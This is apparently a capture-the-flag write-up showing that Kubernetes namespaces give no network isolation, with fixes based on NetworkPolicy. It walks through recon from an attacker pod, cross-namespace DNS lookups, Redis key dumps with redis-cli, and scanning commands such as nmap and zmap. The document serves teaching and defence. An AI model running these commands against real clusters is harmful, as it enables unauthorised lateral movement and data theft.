# Scenario 11: Kubernetes Namespace Bypass

## Overview

This challenge demonstrates a critical misconception in Kubernetes security: **namespaces do not provide network isolation by default**. Many organizations deploy sensitive services in separate namespaces believing they are protected from other workloads, but Kubernetes uses a flat networking model where any pod can communicate with any other pod across all namespaces.

## Attack Vector

Kubernetes namespaces provide:
- **Logical separation** for organizing resources
- **RBAC boundaries** for access control
- **Resource quota** scoping

Kubernetes namespaces do **NOT** provide:
- **Network isolation** - pods can freely communicate across namespaces
- **Service discovery protection** - DNS resolves services in any namespace

An attacker who compromises any pod in the cluster can pivot to access services in "secure" namespaces without any additional exploitation.

## Tools Used

- **kubectl** - Kubernetes cluster interaction
- **redis-cli** - Redis database client
- **nslookup** - DNS resolution testing
- **ip route / ifconfig** - Network reconnaissance

## Attack Walkthrough

### Step 1: Deploy Attacker Foothold

Deployed a pod with reconnaissance tools in the default namespace:

```bash
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
```

### Step 2: Network Reconnaissance

Gathered network information to understand the cluster topology:

```bash
ip route
```

**Result**:
```
default via 10.244.0.1 dev eth0
10.244.0.0/24 via 10.244.0.1 dev eth0  src 10.244.0.14
```

Checked DNS configuration:

```bash
cat /etc/resolv.conf
```

**Result**:
```
search default.svc.cluster.local svc.cluster.local cluster.local
nameserver 10.96.0.10
options ndots:5
```

**Key Finding**: The DNS search domains reveal the Kubernetes service naming convention: `<service>.<namespace>.svc.cluster.local`

### Step 3: Cross-Namespace Service Discovery

Kubernetes DNS allows resolving services in any namespace. Tested resolution of a service in the `secure-middleware` namespace:

```bash
nslookup cache-store-service.secure-middleware.svc.cluster.local
```

**Result**:
```
Server:     10.96.0.10
Address:    10.96.0.10#53

Name:   cache-store-service.secure-middleware.svc.cluster.local
Address: 10.96.18.255
```

**Finding**: Successfully resolved a service in a different namespace - no isolation!

### Step 4: Access Cross-Namespace Service

Connected to the Redis cache service running in the "secure" namespace:

```bash
redis-cli -h cache-store-service.secure-middleware.svc.cluster.local KEYS *
```

**Result**:
```
SECRETSTUFF
```

Retrieved the sensitive data:

```bash
redis-cli -h cache-store-service.secure-middleware.svc.cluster.local GET SECRETSTUFF
```

**Result**: Retrieved the flag, demonstrating complete access to "isolated" services.

## Key Lessons

### The Namespace Isolation Myth

| What Teams Assume | Reality |
|-------------------|---------|
| Different namespace = network isolation | Flat network, all pods can communicate |
| "secure-middleware" namespace is protected | Just a label, no enforcement |
| Internal services are hidden | DNS exposes all service names |
| Attackers need namespace access | Only need any pod in the cluster |

### Alternative Discovery Methods

Even without knowing service names, attackers can:

| Technique | Command | Purpose |
|-----------|---------|---------|
| Port scan entire cluster | `zmap -p 6379 10.0.0.0/8` | Find Redis instances |
| Scan pod network range | `nmap -p- 10.244.0.0/16` | Discover all services |
| DNS zone transfer | `dig axfr cluster.local` | Enumerate all services |
| Kubernetes API | `kubectl get svc -A` | List services (if RBAC allows) |

### Kubernetes DNS Patterns

Services are accessible via predictable DNS names:

```
<service-name>.<namespace>.svc.cluster.local
```

Examples:
- `cache-store-service.secure-middleware.svc.cluster.local`
- `postgres.database.svc.cluster.local`
- `internal-api.backend.svc.cluster.local`

## The Fix: Network Policies

Network Policies are the **only** way to enforce network segmentation in Kubernetes.

### Deny All Ingress (Default Deny)

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: secure-middleware
spec:
  podSelector: {}  # Apply to all pods in namespace
  policyTypes:
    - Ingress
  # No ingress rules = deny all incoming traffic
```

### Allow Only Same-Namespace Traffic

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-same-namespace
  namespace: secure-middleware
spec:
  podSelector: {}
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector: {}  # Only pods in same namespace
```

### Allow Specific Cross-Namespace Access

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-backend
  namespace: secure-middleware
spec:
  podSelector:
    matchLabels:
      app: cache-store
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              name: backend  # Only from backend namespace
          podSelector:
            matchLabels:
              app: api-server  # Only from api-server pods
      ports:
        - protocol: TCP
          port: 6379
```

## Real-World Impact

### Common Vulnerable Patterns

| Service Type | Typical Namespace | Risk if Exposed |
|--------------|-------------------|-----------------|
| Redis/Memcached | caching, middleware | Session hijacking, data theft |
| PostgreSQL/MySQL | database, data | Complete data breach |
| Elasticsearch | logging, monitoring | Log data exfiltration |
| Internal APIs | backend, services | Business logic bypass |
| Vault/Secrets | security, infra | Credential theft |

### Real Incidents

- **Capital One (2019)** - SSRF led to metadata access; flat network allowed lateral movement
- **Tesla Kubernetes (2018)** - Exposed dashboard led to crypto mining; no network segmentation
- Multi-tenant SaaS breaches - Tenant isolation assumed via namespaces, attackers pivoted freely

## Defense Recommendations

### Immediate Actions

1. **Implement default-deny Network Policies** in all sensitive namespaces
2. **Audit cross-namespace communication** - document legitimate flows
3. **Use namespace labels** for policy targeting (`name: secure-middleware`)

### Long-Term Strategy

| Layer | Control | Tool/Approach |
|-------|---------|---------------|
| Network | Default deny + allowlist | NetworkPolicy, Calico, Cilium |
| Service Mesh | mTLS + authorization | Istio, Linkerd |
| Runtime | Detect anomalous connections | Falco, Tetragon |
| Admission | Block pods without policies | Kyverno, OPA Gatekeeper |

### CNI Requirements

Not all CNIs support Network Policies:

| CNI | Network Policy Support |
|-----|------------------------|
| Calico | Full support |
| Cilium | Full support + L7 policies |
| Weave Net | Full support |
| Flannel | No support (needs Calico addon) |
| AWS VPC CNI | Requires Calico addon |

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Remote Services | T1021 | Accessing Redis across namespace boundary |
| Network Service Discovery | T1046 | Port scanning to find internal services |
| Internal Proxy | T1090.001 | Using compromised pod as pivot point |
| Data from Information Repositories | T1213 | Extracting data from cache/database |

## Commands Reference

```bash
# Deploy reconnaissance pod
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh

# Network reconnaissance
ip route
cat /etc/resolv.conf
ifconfig

# DNS enumeration
nslookup <service>.<namespace>.svc.cluster.local

# Port scanning (from inside pod)
nmap -p 6379 10.244.0.0/16
zmap -p 6379 10.0.0.0/8 -o results.csv

# Connect to Redis
redis-cli -h <host> KEYS *
redis-cli -h <host> GET <key>

# List all services (requires RBAC)
kubectl get svc -A

# Check for Network Policies
kubectl get networkpolicies -A

# Test connectivity
nc -zv <service>.<namespace>.svc.cluster.local <port>
```

## References

- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Kubernetes Namespaces](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/)
- [Calico Network Policy Tutorial](https://docs.projectcalico.org/security/tutorials/kubernetes-policy-basic)
- [OWASP Kubernetes Top 10 - K05: Inadequate Network Segmentation](https://owasp.org/www-project-kubernetes-top-ten/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
